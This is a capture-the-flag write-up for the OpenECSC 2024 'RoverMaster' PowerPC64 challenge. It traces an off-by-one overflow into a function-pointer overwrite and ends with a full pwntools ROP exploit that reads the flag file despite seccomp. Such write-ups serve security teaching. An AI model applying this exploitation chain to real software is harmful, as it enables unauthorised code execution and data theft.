---
title: 'OpenECSC 2024 - Round 1'
challenge: 'RoverMaster'
date: 2024-03-28T00:00:00+01:00
author: 'v0lp3'
description: 'Writeup for the OpenECSC 2024 - Round 1 CTF challenge "RoverMaster"' 
cover: '/img/openECSC/logo.png'
tags: ['pwn']
draft: false
---
```
🪐 I'm giving you the keys for the art of mastering rovers... 🪐

nc rovermaster.challs.open.ecsc2024.it 38007
```
## Input surface

Before getting into the challenge, I usually try to interact with it to visually map out where potential attacks could occur. In this case, the challenge involves a [rover](https://en.wikipedia.org/wiki/Rover_(space_exploration)), which is a device often used in space exploration. Let's run the program and examine what it takes in and what it gives out. I'll skip some input details to keep it concise, focusing only on those directly relevant to exploiting the vulnerability.

**For each of the following inputs, if the constraints are not respected, the challenge terminates the connection.**

In the following paragraphs, I will use \$\[a-z\]\$ to indicate input parameters.
### Input: joke

```$
Init done!
Welcome to the Rover Management System. First of all, I need to verify you're an actual human being. So, please, tell me a funny joke!
Joke size: $a$
Joke: $b$
Hahaha! You're fun.
```

**Trigger**:
This interaction occurs upon establishing the connection.

**Constraints**:
- The input `a` must be a *number* where 0 <= a <= 32.
- The input `b` must be a *string* where a <= len(b) <= a + 1.

**Notes**:
Even if we try the combination where a = 32 and len(b) = 33, or where a = 0 and len(b) = 1, the binary doesn't crash.
### Input: option

```
[...]
1. Choose rover
2. Send cmd to rover
3. Execute cmd on rover
Option: $a$
```

**Trigger**:
This interaction is displayed after executing any option and initially after the inputting the joke.

**Constraints**:
- The input `a` must be a *number* where 1 <= a <= 3.

**Notes**:
- Initially, each rover doesn't have a preset command.
- We can execute option 3 only if we have set a command at least once in the selected rover.

### Input: choose the rover

```
[...]
========================
[0] Curiosity 2.0
[1] Ice Explorer
[2] Sulfur Trekker
[3] Methane Surfer
[4] Ice Miner
[5] Solar Glider
[6] Storm Navigator
[7] Lunar Walker
[8] Ice Ranger
[9] Cloud Dancer
[10] Ice Fisher
[11] Dust Racer
[12] Hydrocarbon Hunter
[13] Volcano Voyager
[14] Magnetic Mapper
========================
Choose the rover: $a$
```

**Trigger**:
This interaction is showed if we select option 1 in the [option interaction](##Option).

**Constraints**:
-  The input `a` must be a *number* where 0 <= a <= 14.

### Input: send cmd to rover

```
[...]
[Action list]
========================
[0] Get planet
[1] Set planet
[2] Get name
[3] Set name
[4] Move rover
[5] Full info
========================
Choose the action: $a$
```

**Trigger**: 
This interaction is showed if we select option 2 in the [option interaction](##Option).

**Constraints**:
- The input `a` must be a *number* where 0 <= a <= 5.

**Notes**:
- The command is sent only to the selected rover.
### Input: set name

```
[...]
Sending command: Set name
. . . . . . . . . .
Done!
1. Choose rover
2. Send cmd to rover
3. Execute cmd on rover
Option: 3
Executing command on the rover....
Send new name size: $a$
Send new name size: $b$
```

**Trigger**
This interaction is showed after sending the command '*Set name*' and then executing the command on the selected rover.

**Constraints**:
- The input `a` must be a *number* where 0 <= a <= 256.
- The input `b` must be a *string* where a <= len(b) <= a + 1.

**Notes**:
Even if we try the combination where a = 256 and len(b) = 257, or where a = 0 and len(b) = 1, the binary doesn't crash.
### Input: set planet

``` 
[...]
Sending command: Set planet
. . . . . . . . . .
Done!
1. Choose rover
2. Send cmd to rover
3. Execute cmd on rover
Option: 3
Executing command on the rover....
Send new planet size: $a$
New planet: $b$
Done!
```

**Trigger**
This interaction is showed after sending the command '*Set planet*' and then executing the command on the selected rover.

**Constraints**:
- The input `a` must be a *number* where 0 <= a <= 256.
- The input `b` must be a *string* where a <= len(b) <= a + 1.

**Notes**:
Even if we try the combination where a = 256 and len(b) = 257, or where a = 0 and len(b) = 1, the binary doesn't crash.

## Attachment analysis

Upon uncompressed, the archive provided by the challenge contains the following files:

```bash
$ tree -a .
.
├── README.md
├── host
	├── Dockerfile
	├── debian-12-generic-ppc64el-20240211-1654.qcow2.ready
	├── docker-compose.yml
	├── flag
	│   └── .env
	└── run.sh

```

From the `debian-12-generic-ppc64el-20240211-1654.qcow2.ready` file, we can extract the `main` binary using the `7z` tool. Another method is described in the `README.md` file.

From the following command, we can see that the binaryis statically linked with libraries and was compiled for the ppc64 (PowerPC) architecture:

```bash
$ file ./host/main
main: ELF 64-bit LSB executable, 64-bit PowerPC or cisco 7500, OpenPOWER ELF V2 ABI, version 1 (GNU/Linux), statically linked, BuildID[sha1]=497ee6f8ded126b012877d8d2cbdade822a8d0a5, for GNU/Linux 3.10.0, not stripped
```

Also, it is worth noting that the binary isn't a position-independent executable ([PIE](https://en.wikipedia.org/wiki/Position-independent_code)). This is advantageous because, with the binary being statically compiled, we can access all functions of libc without any memory leaks if we manage to corrupt the memory.

```bash
$ checksec ./host/main
    Arch:     powerpc64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000000)
```

From [Ghidra](https://ghidra-sre.org/), we can continue our analysis and find that there is a `rover` structure defined with a size of *0x20e bytes*, as follows:

```
struct rover {
	char planet_name[256];
	char rover_name[256];
	void (*cmd)();
	uint8_t weight;
	uint8_t x;
	uint8_t y;
	uint8_t z;
	uint8_t battery;
	uint8_t temperature;
};
```

The *rovers* are stored in an array of *size 15* `rover[15]`, which starts at address `0x10110116`. 

Additionally, we find that:
- At address `0x10111fe8`, there is a global variable `g_action_names`, which is a `char*[6]` array containing the pointers to the names of the actions.
- At address `0x1010c918`, there is a global variable `g_actions`, which is a `void*[6]` array containing the function pointers to the actions.
- At address `0x101140c8`, there is a global variable `g_cur_rover_idx`, which defines the index of the currently selected rover.

From the disassembled code, it's clear that when we send a command, the `cmd` attribute of the selected rover is set with the pointer to the function from `g_actions`.

{{< figure src="/img/openECSC/rovermaster/opt_send_cmd.png" position="left" caption="Disassembled code, send_cmd function." captionPosition="left">}}

Later, when we execute the command, that pointer is invoked.

{{< figure src="/img/openECSC/rovermaster/execute_cmd.png" position="left" caption="Disassembled code, execute_cmd function." captionPosition="left">}}

To conclude the analysis, as observed earlier, we noted that one more character than the selected size can be inserted. This is due to the function `read_exactly`, where the check should have been `joke_size < i + 1`. This leads to a byte injection into the adjacent location.

{{< figure src="/img/openECSC/rovermaster/read_exactly.png" position="left" caption="Disassembled code, read_exactly function." captionPosition="left">}}

When we input the joke, no crash occurs because the overflow is insufficient, as expected.

{{< figure src="/img/openECSC/rovermaster/stack_ghidra.png" position="left" caption="Disassembled code, stack in the main function." captionPosition="left">}}

The information provided is sufficient to understand the exploit. Both the functions `cmd_set_planet` and `cmd_set_name` of the rover utilize the same `read_exactly` function, hence they suffer from the same bug.

## Exploitation

Before diving into exploitation, we need to set up the environment for debugging. Essentially, add the argument `-gdb tcp:0.0.0.0:9000` to the `start.sh` file provided in the attached files. This enables the [gdbstub](https://wiki.qemu.org/Features/gdbstub) and allows you to connect to the gdb server provided by QEMU.

The strategy to exploit this bug is to overflow the name buffer inside the rover structure in order to corrupt the last byte of the cmd function pointer of the selected rover.

```
[...]
Done!
1. Choose rover
2. Send cmd to rover
3. Execute cmd on rover
Option: 3
Executing command on the rover....
Send new name size: 256
New name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Done!
1. Choose rover
2. Send cmd to rover
3. Execute cmd on rover
Option: 3
Executing command on the rover....

Segmentation Fault
```

For example, one could select the command to set the name, set the size to 256 (which is the maximum allowed value), and send 257 characters. Then execute the command again on the rover to invoke the partially controlled pointer.

Note that `cmd_set_name` is the only pointer we can poison for two reasons:
- The `name` attribute is the only one adjacent to a function pointer.
- When we set a command, the pointer is entirely (re)written into the `cmd` attribute.

From here, we can construct a ROP chain to execute arbitrary code. Normally, the goal would be to obtain a shell. However, from the `init` function in the binary, we know that [seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html) is enabled with _SECCOMP_MODE_STRICT_. This means that only the _read_, _write_, and _exit_ syscalls are enabled.

{{< figure src="/img/openECSC/rovermaster/init.png" position="left" caption="Disassembled code, init function." captionPosition="left">}}

We can bypass this filter using `openat` instead of `open` and `execveat` instead of `execve` [as described here](https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html).  Nevertheless `execveat` wasn't included during compilation, so our ROP chain will open(at) the flag file at the directory */home/user/flag*, read its content and write it to stdout. 

So, where do we jump? The function `cmd_set_name` is at address `0x10000e84`, which means the useful range is `0x10000e00-0x10000eff`.

Luckily, if we jump to `0x10000e60` (the final code of `cmd_set_planet`), the data stored in the `joke` buffer is popped from the stack into the [link register](https://en.wikipedia.org/wiki/Link_register)(*lr*), as depicted below.

{{< figure src="/img/openECSC/rovermaster/gdb_entrypoint.png" position="left" caption="GDB debugging, breakpoint at 0x10000e60, joke buffer filled with 32 bytes 'A'" captionPosition="left">}}

From here, we have full control over the instruction pointer and we can comfortably place our chain on rovers. To find useful gadgets, I used the tool [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).

The PowerPC 64 instructions are similar to x86-64 with a minor difference: the returning address isn't automatically popped from the stack after executing a return and if we don't change the value of the link register, the binary will just loop on return.
As shown in the screenshot above, before a `blr` (equivalent to `ret`), we need to execute an `mtlr` instruction to move the value from a register to the link register, which maintains the location to jump when returning from a function. Alternatively we can use the unconditional branch call (`bctrl`) which will return as a usual function call.

Fundamentally, the challenge lies in finding the appropriate gadgets to construct the primitive for calling a function (or other gadgets) and returning to the correct location. The entire chain relies mainly on these two gadgets:

```python
set_r31 = 0x0000000010022144 # addi r1, r1, 0x40 ; ld r0, 0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
call_r12 = 0x0000000010022134  # ld r12, 0x18(r31) ; mtctr r12 ; bctrl ; ld r2, 0x18(r1) ; addi r1, r1, 0x40 ; ld r0, 0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
```

We need to maintain the *r1* register at a controllable value. This will serve as the script to follow, similar to the stack in a classic ROP scenario.

The gadget `set_r31` allows us to set an arbitrary value to register *r31*. If we want to call a function, we simply place the address of the memory containing the pointer to the desired function in *r31* and return to the `call_r12` gadget.

Example:

```python
rover = lambda x: 0x10110216 + (x * 0x20e)

[...]
p64(set_r31), 
p64(openat), # function to call
p64(0x0) * 3, # padding
p64(rover(1) + 2 - 0x10), # value popped into r31. r31 = &openat pointer
p64(0x0) * 2, # padding
p64(call_r12), # r12 = *r31 = openat 
[...]
```

This gadget will dereference the address stored in *r31* and move the pointer to register *r12*. Then, the instructions `mtctr r12; bctrl` will move this value to the link register, and after executing that function, the program will resume execution of the `call_r12` gadget after `bctrl` instruction.

As mentioned earlier, considering all rovers, we have sufficient space to store our ROP chain and the string */home/user/flag*. We can use the `planet_name` buffer and the `rover_name` buffer of each rover for this purpose. We only need to ensure that we jump to the next rover after we've filled the memory of the previous one. For this purpose, I used the following gadgets:

```python
move_little_stack = 0x0000000010057C50  # addi r1, r1, 0x20 ; ld r0, 0x10(r1) ; mtlr r0 ; blr
move_medium_stack = 0x00000000100BB778  # addi r1, r1, 0x40 ; mr r3, r31 ; ld r30, -0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
move_medium_stack_2 = 0x00000000100A9210  # addi r1, r1, 0x50 ; mr r3, r9 ; ld r0, 0x10(r1) ; mtlr r0 ; blr
```

I start writing part of the ROP in the `planet_name` of rover 1, then another part in the `rover_name` of the same rover, and continue in the adjacent rover attributes, and so on.

The signatures of the functions called during the ROP are:

```c
int openat(int dirfd, const char *pathname, int flags);
ssize_t read(int fd, void *buf, size_t count);
int puts(const char *s);
```

{{< figure src="/img/openECSC/rovermaster/openat.png" position="left" caption="GDB debugging, registers r4 and r5 before executing openat" captionPosition="left">}}

| Step | Scope       | Value of the register *r3*                                                                                             | Value of the register *r4*                                                                                    | Value of the register *r5*                                                                                                                                          |
| ---- | ----------- | ---------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | Call openat | No need to set because the path in *r4* is absolute.                                                                   | Address of the buffer containing `/home/user/flag`                                                            | Must be cleared to zero: `O_RDONLY`                                                                                                                                 |
| 2    | Call read   | No need to set it because it will contain the return value of `openat`, which is the file descriptor of the flag file. | No need to set it because it remains unchaged by `openat`. We overwrite the flag's path with the flag itself. | It must contain the number of characters to read. I've found a gadget to copy the content of register *r4* into *r5*, which might seem like overkill, but it works. |
| 3    | Call puts   | It must contain the address of the buffer where we read earlier.                                                       | Not in use.                                                                                                   | Not in use.                                                                                                                                                         |

{{< figure src="/img/openECSC/rovermaster/read.png" position="left" caption="GDB debugging, registers r3,r4 and r5 before executing read." captionPosition="left">}}


{{< figure src="/img/openECSC/rovermaster/puts.png" position="left" caption="GDB debugging, register r3 before executing puts." captionPosition="left">}}

Here is the full script:

```python
from pwn import *

r = remote("rovermaster.challs.open.ecsc2024.it", 38007)

rover = lambda x: 0x10110216 + (x * 0x20E)
planet = lambda x: 0x10110116 + (x * 0x20E)


def choose_rover(r, rover):
    r.sendlineafter(b":", b"1")
    r.sendlineafter(b"rover:", rover)


def send_cmd(r, action_id):
    r.sendlineafter(b"Option:", b"2")
    r.sendlineafter(b"action:", action_id)


def set_planet(r, size, name):
    send_cmd(r, b"1")

    r.sendlineafter(b"Option:", b"3")
    r.sendlineafter(b"size:", f"{size}".encode())
    r.sendlineafter(b"planet:", name)


def set_name(r, size, name):
    send_cmd(r, b"3")

    r.sendlineafter(b"Option:", b"3")
    r.sendlineafter(b"size:", f"{size}".encode())
    r.sendlineafter(b"name:", name)


set_r31 = 0x0000000010022144  # addi r1, r1, 0x40 ; ld r0, 0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
call_r12 = 0x0000000010022134  # ld r12, 0x18(r31) ; mtctr r12 ; bctrl ; ld r2, 0x18(r1) ; addi r1, r1, 0x40 ; ld r0, 0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
set_r3 = 0x00000000100379E0  #  addi r1, r1, 0x40; mr r3, r31 ; ld r0, 0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
move_little_stack = 0x0000000010057C50  # addi r1, r1, 0x20 ; ld r0, 0x10(r1) ; mtlr r0 ; blr
move_medium_stack = 0x00000000100BB778  # addi r1, r1, 0x40 ; mr r3, r31 ; ld r30, -0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
move_medium_stack_2 = 0x00000000100A9210  # addi r1, r1, 0x50 ; mr r3, r9 ; ld r0, 0x10(r1) ; mtlr r0 ; blr
call_r12_li_r5 = 0x0000000010023124  # ld r12, 0x48(r31) ; li r5, 0 ; mtctr r12 ; bctrl ; ld r2, 0x18(r1) ; addi r1, r1, 0x50 ; ld r0, 0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
ld_r4 = 0x00000000100B2F38  # nop, ld r4, 0x1588(r2) ; std r0, 0x30(r1) ; bl 0x10039200 ; nop ; ld r0, 0x30(r1) ; mtlr r0 ; addi r1, r1, 0x20 ; blr
mr_r3_r4 = 0x0000000010032438  # mr r3, r4 ; blr
ld_some_registers = 0x000000001007363C  # ld r1, 0(r1) ; ld r0, 0x10(r1) ; ld r26, -0x30(r1) ; ld r27, -0x28(r1) ; ld r28, -0x20(r1) ; ld r29, -0x18(r1) ; ld r30, -0x10(r1) ; ld r31, -8(r1) ; mtlr r0 ; blr
or_r5_r4 = 0x00000000100B14F8  # or r5, r5, r4 ; rldicl r8, r5, 1, 0xf ; rotldi r8, r8, 0x3f ; or r8, r8, r9 ; rldimi r8, r10, 0x3f, 0 ; mr r7, r8 ; mtvsrdd v2, r7, r6 ; blr

openat = 0x10081070
puts = 0x10019D70
read_fn = 0x10037990

###################################################################################

pt_0 = flat(
    cyclic(8),
    p64(planet(0x1) + 2 + 0x70),  # new link register
    p64(0x0),
    p64(ld_some_registers),
).ljust(32)


pt1 = flat(
    p16(0x0),
    p64(0x0) * 16,
    p64(set_r31),
    p64(ld_r4),
    p64(0x0) * 3,
    p64(planet(1) + 2 + 0x40),  # r31 => &ld_r4
    p64(0x0) * 2,
    p64(call_r12_li_r5),
    p64(0x0),
    p64(rover(14)),
).ljust(0x100, p8(0x0))


pt2 = flat(
    p16(0x0),
    p64(set_r31),
    p64(openat),
    p64(0x0) * 3,
    p64(rover(1) + 2 - 0x10),  # r31 => &openat
    p64(0x0) * 2,
    p64(call_r12),
    p64(0x0) * 7,
    p64(move_little_stack),
    p64(0x0) * 3,
    p64(set_r31),
    p64(0x0) * 4,
    p64(rover(1) + 2 + 0xD8),  # r31 => &move_little_stack
    p64(0x0) * 2,
    p64(call_r12),
    p64(0x4),
    p64(or_r5_r4),
).ljust(0x100, p8(0x0))


pt3 = flat(
    p64(0x0) * 2 + p32(0x0),
    p64(set_r31),
    p64(move_little_stack),
    p64(0x0) * 6,
    p64(set_r31),
    p64(0x0) * 2,
    p64(read_fn),
    p64(0x0),
    p64(planet(2) + 4 + 0x50),  # r31 => &read
    p64(0x0) * 2,
    p64(call_r12),
    p64(0x0) * 7,
    p64(move_medium_stack_2),
).ljust(0x100, p8(0x0))

pt4 = flat(
    p64(0x0) * 4 + p32(0x0),
    p64(set_r31),
    p64(0x0) * 2,
    p64(mr_r3_r4),
    p64(0x0),
    p64(rover(2) + 4 + 0x20),  # r31 => &mr_r3_r4
    p64(0x0) * 2,
    p64(call_r12),
    p64(0x0) * 7,
    p64(puts),
    p64(0x0) * 3,
).ljust(0x100, p8(0x0))

###################################################################################

log.info("Setting ROP entrypoint")
r.sendlineafter(b"size:", b"32")
r.sendlineafter(b"Joke:", pt_0)

log.info("Setting flag path in rover 14")
choose_rover(r, b"14")
flag_name = b"/home/user/flag\x00"
set_name(r, len(flag_name), flag_name)

log.info("Setting ROP in rover 1")
choose_rover(r, b"1")
set_planet(r, 0x100, pt1)
set_name(r, 0x100, pt2)

log.info("Setting ROP in rover 2")
choose_rover(r, b"2")
set_planet(r, 0x100, pt3)
set_name(r, 0x100, pt4)

log.info("Poisoning function pointer in rover 0")
choose_rover(r, b"0")
set_name(r, 0x100, b"A" * 0x100 + b"\x60")

log.info("Triggering exploit")
r.sendlineafter(b"Option:", b"3")

r.recvuntil(b"...\n")

r.interactive()
```

> openECSC{r0pping_on_th3_rovers_l1ke_th3res_n0_t0morr0w_5e016189}